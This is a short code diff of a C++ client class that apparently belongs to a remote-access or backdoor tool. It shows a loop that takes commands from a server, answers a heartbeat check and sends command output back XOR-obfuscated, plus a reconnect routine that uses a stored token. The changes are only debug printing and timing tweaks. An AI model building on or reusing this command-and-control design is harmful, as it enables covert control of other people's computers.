@@ -58,8 +58,8 @@ int Connexion::main(bool is_admin, string path_prog)
     
     while(true)
     {
-        Sleep(1000);
-        
+        //Sleep(1000);
+        cout << "in main...." << endl;
         command = recvSafe(); //Recv safe and decrypt xor
 
         if(command.find("is_life?") != string::npos)
@@ -193,16 +193,17 @@ Once the function is finished send "\r\n" to signal to the server that the clien
         cout << "Multiple request: " << endl;
         for(i=0;i< result_of_command.size(); i++)
         {
-            cout << "size of request: " << result_of_command[i].length() << endl;
+            
             request = result_of_command[i];
-            //cout << request << endl;
+            
             send(sock_client, XOREncryption(request).c_str(), request.length(),0);
-
-            size_all_result_of_command += request.length();
-             cout << "I: " <<i <<endl;
+            
+            cout << request << endl;
+            cout << "size of request: " << result_of_command[i].length() << endl;
+            cout << "I: " <<i <<endl;
             cout << "---------------------------\n\n" << endl;
             //cout<<  XOREncryption(request) << endl;
- 
+            size_all_result_of_command += request.length();
             Sleep(100);   
         }
     }
@@ -254,7 +255,7 @@ void Connexion::closeConnexion()
 void Connexion::reConnect()
 {   
     string request;
-
+    cout << "GO TO RECO..." << endl;
     //if the client has a token then reconnects without handshaking
 
     closeConnexion();
